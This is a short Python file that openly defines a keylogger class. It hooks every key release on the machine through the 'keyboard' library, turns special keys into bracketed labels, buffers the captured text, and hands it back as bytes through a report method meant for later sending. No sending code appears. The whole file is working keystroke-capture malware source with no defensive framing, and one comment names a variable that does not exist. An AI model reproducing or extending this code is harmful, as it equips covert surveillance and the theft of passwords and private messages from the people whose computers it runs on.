import time
import keyboard
import threading

# Class represents a keylogger that sends pressed keys every report
class KeyLogger(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.data = ''

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.data += name

    # Function returns last recorded keystrokes in binary
    def report(self):
        last_keystrokes = self.data
        self.data = ''
        return last_keystrokes.encode()

    def run(self):
        # Start recording
        keyboard.on_release(callback=self.callback)
        keyboard.wait()

